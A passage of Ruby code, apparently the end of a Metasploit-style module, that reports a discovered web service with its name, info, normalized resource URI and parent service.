    report_service(
      common.merge(
        name: service_name,
        info: service_info,
        resource: { uri: normalize_uri(resource_path) },
        parents: web_service
      )
    )
  end
end
